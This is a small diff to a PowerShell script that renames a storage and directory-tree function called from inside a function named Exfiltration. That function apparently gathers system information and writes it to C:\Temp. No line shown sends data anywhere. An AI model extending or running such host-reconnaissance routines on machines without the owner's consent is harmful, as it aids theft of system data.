@@ -58,7 +58,7 @@ function Exfiltration {
     SysInfo
 
     #Call Get-StorageAndTreeInfo
-    Get-StorageAndTreeInfo
+    StorageAndTreeInfo
     
 }
 
@@ -172,7 +172,7 @@ function SysInfo {
 
 
 # Function to get storage and directory tree information
-function Get-StorageAndTreeInfo {
+function StorageAndTreeInfo {
     # Create or clear the Storage_Info.txt file
     $storageFilePath = "C:\Temp\Storage_Info.txt"
     Set-Content -Path $storageFilePath -Value $null
